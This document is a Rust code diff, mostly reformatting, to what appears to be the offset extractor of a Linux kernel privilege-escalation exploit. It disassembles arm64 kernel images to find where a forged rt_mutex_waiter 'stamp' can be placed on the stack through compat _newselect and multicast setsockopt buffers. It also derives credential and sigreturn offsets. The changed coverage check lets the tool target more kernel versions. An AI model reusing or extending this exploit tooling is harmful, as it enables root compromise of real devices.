@@ -7,9 +7,9 @@ use regex::Regex;
 
 use crate::btf::Btf;
 use crate::disasm::{
-    add_sp_immediates, cmp_immediates, cmp_immediates_any_width, disassemble_range,
-    first_sp_frame, has_call_or_tail_branch, has_direct_call,
-    is_mov_w0_wzr, is_mov_x1, materialized_address, split_line, validate_frame_live_at,
+    add_sp_immediates, cmp_immediates, cmp_immediates_any_width, disassemble_range, first_sp_frame,
+    has_call_or_tail_branch, has_direct_call, is_mov_w0_wzr, is_mov_x1, materialized_address,
+    split_line, validate_frame_live_at,
 };
 use crate::error::{ExtractError, Result};
 use crate::kallsyms::unique_or_err;
@@ -239,9 +239,7 @@ fn copy_cap_from_dis(lines: &[String]) -> Vec<u64> {
             if second.get(1).map(|value| value.as_str()) != Some(register.as_str()) {
                 continue;
             }
-            let Some(limit) =
-                u64::from_str_radix(second.get(2).unwrap().as_str(), 16).ok()
-            else {
+            let Some(limit) = u64::from_str_radix(second.get(2).unwrap().as_str(), 16).ok() else {
                 continue;
             };
             if (0x11..=0x101).contains(&limit) {
@@ -332,7 +330,7 @@ pub fn derive_tcp_zerocopy_layout(
         other => {
             return Err(ExtractError::new(format!(
                 "do_tcp_getsockopt: tcp copy cap candidates not unique: {other:x?}"
-            )))
+            )));
         }
     };
     /* The TCP getsockopt path: the syscall wrapper -> (__sys_getsockopt) ->
@@ -352,7 +350,13 @@ pub fn derive_tcp_zerocopy_layout(
     )?;
     let sys_linked = unique_offset_optional(symbols, "__sys_getsockopt")
         .is_some_and(|target| has_call_or_tail_branch(&wrapper, target));
-    let tcp = disassemble_symbol(kernel, symbols, sorted_offsets, "tcp_getsockopt", OBJDUMP_CAP)?;
+    let tcp = disassemble_symbol(
+        kernel,
+        symbols,
+        sorted_offsets,
+        "tcp_getsockopt",
+        OBJDUMP_CAP,
+    )?;
     if !has_direct_call(&tcp, unique_offset(symbols, "do_tcp_getsockopt")?) {
         return Err(ExtractError::new(
             "tcp_getsockopt does not directly call do_tcp_getsockopt",
@@ -383,7 +387,8 @@ pub fn derive_tcp_zerocopy_layout(
 /// One-shot multicast stack geometry derived from the target kernel image
 /// (no device, no root). Depths are measured from the syscall stack top.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub struct McastWaiterGeometry {    pub waiter_off: u64,
+pub struct McastWaiterGeometry {
+    pub waiter_off: u64,
     pub setsockopt_depth: u64,
     pub waiter_depth: u64,
 }
@@ -505,8 +510,10 @@ fn waiter_local_from_dis(lines: &[String], pi_tree_entry: u64) -> Option<u64> {
 
     let mut candidates: Vec<(String, u64)> = Vec::new();
     for (reg, imm) in add_sp_immediates(lines) {
-        let index =
-            Regex::new(&format!(r"(?i)\badd\s+x\d+,\s*{reg},\s*#0x{pi_tree_entry:x}\b")).unwrap();
+        let index = Regex::new(&format!(
+            r"(?i)\badd\s+x\d+,\s*{reg},\s*#0x{pi_tree_entry:x}\b"
+        ))
+        .unwrap();
         if lines.iter().any(|line| index.is_match(line)) {
             candidates.push((reg, imm));
         }
@@ -600,14 +607,12 @@ pub(crate) fn multicast_waiter_off_at(
             numbers(0, setsockopt_frames, waiter_depth),
         )
     })?;
-    let waiter_off = setsockopt_depth
-        .checked_sub(waiter_depth)
-        .ok_or_else(|| {
-            ExtractError::infeasible_with(
-                "no multicast overlap in stack geometry",
-                numbers(0, setsockopt_depth, waiter_depth),
-            )
-        })?;
+    let waiter_off = setsockopt_depth.checked_sub(waiter_depth).ok_or_else(|| {
+        ExtractError::infeasible_with(
+            "no multicast overlap in stack geometry",
+            numbers(0, setsockopt_depth, waiter_depth),
+        )
+    })?;
     if waiter_off == 0 {
         return Err(ExtractError::infeasible_with(
             "multicast waiter_off is zero; the app requires a positive offset",
@@ -662,9 +667,8 @@ pub(crate) fn multicast_waiter_off_at(
 mod tests {
     use super::{
         compat_carrier_coverage, fpsimd_copy_destination, max_pselect_shift,
-        multicast_geometry_corroborated, multicast_geometry_btf_only,
-        pselect_shift_from_delta, remove_waiter_uses_current, select_cred_caps, select_cred_refs,
-        sigreturn_offset,
+        multicast_geometry_btf_only, multicast_geometry_corroborated, pselect_shift_from_delta,
+        remove_waiter_uses_current, select_cred_caps, select_cred_refs, sigreturn_offset,
     };
     use std::collections::BTreeMap;
 
@@ -737,11 +741,11 @@ mod tests {
         /* The six store images measure home 0x1b0 / dst 0x1e0 (time32) and the
          * time64 alternative packs at 0x20. Both must pass. */
         assert_eq!(
-            compat_carrier_coverage(0x1b0, 0x1e0),
+            compat_carrier_coverage(0x1b0, 0x1e0, false),
             Some(("futex_time32", 0x30))
         );
         assert_eq!(
-            compat_carrier_coverage(0x1c0, 0x1e0),
+            compat_carrier_coverage(0x1c0, 0x1e0, true),
             Some(("futex_time64", 0x20))
         );
     }
@@ -750,24 +754,32 @@ mod tests {
     fn compat_coverage_refuses_a_strip_deeper_than_the_buffer() {
         /* 5.10.236: the compat strip lands at 0x200/0x210, deeper than the
          * 0x1e0 _newselect buffer. */
-        assert_eq!(compat_carrier_coverage(0x200, 0x1e0), None);
-        assert_eq!(compat_carrier_coverage(0x210, 0x1e0), None);
+        assert_eq!(compat_carrier_coverage(0x200, 0x1e0, false), None);
+        assert_eq!(compat_carrier_coverage(0x210, 0x1e0, true), None);
     }
 
     #[test]
-    fn compat_coverage_refuses_an_unknown_home() {
-        /* The helper implements the futex_time32 (0x1b0) and futex_time64
-         * (0x1c0) entries only; any other derived home is a capability
-         * refusal, not a guess. */
-        assert_eq!(compat_carrier_coverage(0x1a8, 0x1e0), None);
-        assert_eq!(compat_carrier_coverage(0x1d0, 0x1e0), None);
+    fn compat_coverage_accepts_a_novel_home_when_it_fits() {
+        /* The ABI is the entry that produced the home, not a match on the
+         * home's value; a 6.x entry may put the same strip elsewhere. */
+        assert_eq!(
+            compat_carrier_coverage(0x1d0, 0x1e0, true),
+            Some(("futex_time64", 0x10))
+        );
+        assert_eq!(
+            compat_carrier_coverage(0x1d0, 0x200, false),
+            Some(("futex_time32", 0x30))
+        );
+        /* A novel home still has to fit the bitmap and the zero tail. */
+        assert_eq!(compat_carrier_coverage(0x1a8, 0x1e0, false), None);
+        assert_eq!(compat_carrier_coverage(0x1c0, 0x220, true), None);
     }
 
     #[test]
     fn compat_coverage_requires_the_zero_tail_inside_res() {
         /* With dst == home the res_* window sits below the stamp's zero tail,
          * so the time32 stamp would rely on bytes the kernel never zeroes. */
-        assert_eq!(compat_carrier_coverage(0x1b0, 0x1b0), None);
+        assert_eq!(compat_carrier_coverage(0x1b0, 0x1b0, false), None);
     }
 
     #[test]
@@ -1543,9 +1555,8 @@ fn futex_strip_home(
 /// reports why instead.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub struct CompatCarrierLayout {
-    /// The strip home below the compat entry sp: 0x1b0 (futex_time32) or
-    /// 0x1c0 (futex_time64). Those are the two entries the armv7 helper
-    /// implements; any other derived home is a capability refusal.
+    /// The strip home below the compat entry sp, derived from this image's
+    /// futex entry (not matched against a constant).
     pub waiter_home: u64,
     /// The compat `_newselect` fd_set buffer's deepest byte (depth).
     pub select_dst_depth: u64,
@@ -1554,6 +1565,9 @@ pub struct CompatCarrierLayout {
     /// `futex_time32` or `futex_time64`; names the syscall entry the home was
     /// derived from.
     pub abi: &'static str,
+    /// 0 = futex_time32, 1 = futex_time64; the profile's `compat_futex_abi`.
+    /// The runtime cannot recover the ABI from a novel home, so it travels.
+    pub futex_abi: u8,
 }
 
 /// The carrier's bitmap geometry, mirroring the app's packer: three 40-byte
@@ -1561,41 +1575,39 @@ pub struct CompatCarrierLayout {
 pub const COMPAT_BITMAP_BYTES: u64 = 0x78;
 pub const COMPAT_SET_BYTES: u64 = 40;
 const COMPAT_TIME32_WORDS: u64 = 9;
-const COMPAT_TIME32_HOME: u64 = 0x1b0;
-const COMPAT_TIME64_HOME: u64 = 0x1c0;
 
-/// Pure coverage check: given the derived strip home and buffer depth, does
-/// the compat `_newselect` copy carry the stamp? The home selects the ABI the
-/// helper would call; the kernel's `res_*` zeroing covers the time32 stamp's
-/// last two words at depths `[dst-6set, dst-3set]`, the time64 stamp is
-/// user-copied whole.
-pub fn compat_carrier_coverage(home: u64, dst: u64) -> Option<(&'static str, u64)> {
+/// Pure coverage check: given the derived strip home, buffer depth and the
+/// futex ABI the home came from, does the compat `_newselect` copy carry the
+/// stamp? The ABI is an input (the entry that produced the home), not a match
+/// on the home's value: a 6.x entry may put the same strip at another depth.
+/// The kernel's `res_*` zeroing covers the time32 stamp's last two words at
+/// depths `[dst-6set, dst-3set]`; the time64 stamp is user-copied whole.
+pub fn compat_carrier_coverage(home: u64, dst: u64, time64: bool) -> Option<(&'static str, u64)> {
     if dst < home {
         return None;
     }
     let offset = dst - home;
-    match home {
-        COMPAT_TIME32_HOME if offset + COMPAT_TIME32_WORDS * 8 <= COMPAT_BITMAP_BYTES => {
-            let tail_deepest = home as i64 - 0x48;
-            let tail_shallowest = home as i64 - 0x57;
-            let zero_deepest = dst as i64 - 6 * COMPAT_SET_BYTES as i64;
-            let zero_shallowest = dst as i64 - 3 * COMPAT_SET_BYTES as i64;
-            (tail_deepest <= zero_shallowest && tail_shallowest >= zero_deepest)
-                .then_some(("futex_time32", offset))
-        }
-        COMPAT_TIME64_HOME if offset + WAITER_STRIP_BYTES <= COMPAT_BITMAP_BYTES => {
-            Some(("futex_time64", offset))
-        }
-        _ => None,
+    if time64 {
+        return (offset + WAITER_STRIP_BYTES <= COMPAT_BITMAP_BYTES)
+            .then_some(("futex_time64", offset));
     }
+    if offset + COMPAT_TIME32_WORDS * 8 > COMPAT_BITMAP_BYTES {
+        return None;
+    }
+    let tail_deepest = home as i64 - 0x48;
+    let tail_shallowest = home as i64 - 0x57;
+    let zero_deepest = dst as i64 - 6 * COMPAT_SET_BYTES as i64;
+    let zero_shallowest = dst as i64 - 3 * COMPAT_SET_BYTES as i64;
+    (tail_deepest <= zero_shallowest && tail_shallowest >= zero_deepest)
+        .then_some(("futex_time32", offset))
 }
 
 /// Derive the compat carrier's geometry from the image:
 /// `__arm64_compat_sys_select -> do_compat_select -> compat_core_sys_select`
 /// gives the `_newselect` buffer depth; the 32-bit futex entries give the two
 /// candidate strip homes (`futex_time32`, and `futex_time64` reusing the
-/// 64-bit wrapper). The image's waiter must be the 5.x flat strip the
-/// carrier's stamp encodes (no `wake_state`).
+/// 64-bit wrapper). The waiter must be the compact eleven-word strip; the
+/// 5.15/6.1 `wake_state` word is the packed prio the native builds.
 pub fn derive_compat_carrier_layout(
     kernel: &[u8],
     symbols: &RelSymbols,
@@ -1609,14 +1621,27 @@ pub fn derive_compat_carrier_layout(
         None => {
             return Err(ExtractError::new(
                 "compat carrier: no BTF and the no-BTF waiter template is 5.10-only",
-            ))
+            ));
         }
     };
-    if waiter.wake_state.is_some() {
-        return Err(ExtractError::new(
-            "compat carrier: the image's waiter has a wake_state field; the carrier's \
-             stamp is the 5.x flat strip",
-        ));
+    /* The carrier's stamp is the eleven-word compact strip. The 5.15/6.1
+     * shape's +0x40 word is the packed `(prio << 32) | wake_state` the native
+     * builds (`waiter_prio_word`), so a `wake_state` field is accepted; the
+     * non-compact `rt_waiter_node` shape is not representable. */
+    if let Some(btf) = btf {
+        match crate::layout::waiter_is_compact(btf) {
+            Some(true) => {}
+            Some(false) => {
+                return Err(ExtractError::new(
+                    "compat carrier: the waiter is the non-compact rt_waiter_node shape",
+                ));
+            }
+            None => {
+                return Err(ExtractError::new(
+                    "compat carrier: BTF names no rt_mutex_waiter shape",
+                ));
+            }
+        }
     }
     let pi_tree = waiter.pi_tree_entry;
 
@@ -1685,7 +1710,10 @@ pub fn derive_compat_carrier_layout(
         }
     }
     if buffer_candidates.len() != 1 {
-        let hex: Vec<String> = buffer_candidates.iter().map(|v| format!("{v:#x}")).collect();
+        let hex: Vec<String> = buffer_candidates
+            .iter()
+            .map(|v| format!("{v:#x}"))
+            .collect();
         return Err(ExtractError::new(format!(
             "compat_core_sys_select fd_set buffer candidates not unique: {hex:?}"
         )));
@@ -1732,16 +1760,17 @@ pub fn derive_compat_carrier_layout(
     )?;
 
     let mut refused = Vec::new();
-    for (home, entry) in [
-        (time32_home, "futex_time32"),
-        (time64_home, "futex_time64"),
+    for (home, time64, entry) in [
+        (time32_home, false, "futex_time32"),
+        (time64_home, true, "futex_time64"),
     ] {
-        if let Some((abi, offset)) = compat_carrier_coverage(home, select_dst_depth) {
+        if let Some((abi, offset)) = compat_carrier_coverage(home, select_dst_depth, time64) {
             return Ok(CompatCarrierLayout {
                 waiter_home: home,
                 select_dst_depth,
                 offset,
                 abi,
+                futex_abi: u8::from(time64),
             });
         }
         refused.push(format!(
@@ -1886,9 +1915,15 @@ fn compat_multicast_copies(
     let tif = Regex::new(r"(?i)\btbnz\s+w8,\s*#0x16,\s*0x([0-9a-f]+)\b").unwrap();
     let mut compat: BTreeSet<(u64, u64)> = BTreeSet::new();
     for line in lines {
-        let Some(caps) = tif.captures(line) else { continue };
-        let Ok(target) = u64::from_str_radix(&caps[1], 16) else { continue };
-        let Some(relative) = target.checked_sub(function_addr) else { continue };
+        let Some(caps) = tif.captures(line) else {
+            continue;
+        };
+        let Ok(target) = u64::from_str_radix(&caps[1], 16) else {
+            continue;
+        };
+        let Some(relative) = target.checked_sub(function_addr) else {
+            continue;
+        };
         if relative % 4 != 0 {
             continue;
         }
@@ -1950,7 +1985,7 @@ pub fn derive_compat_multicast_layout(
         None => {
             return Err(ExtractError::new(
                 "compat multicast: no BTF and the no-BTF waiter template is 5.10-only",
-            ))
+            ));
         }
     };
     let compact = match btf {
@@ -2045,7 +2080,9 @@ pub fn derive_compat_multicast_layout(
         ("futex_time64", 1u8, time64_home),
         ("futex_time32", 0u8, time32_home),
     ] {
-        let Some(off) = copy_depth.checked_sub(home) else { continue };
+        let Some(off) = copy_depth.checked_sub(home) else {
+            continue;
+        };
         if off == 0 || off % 8 != 0 {
             continue;
         }
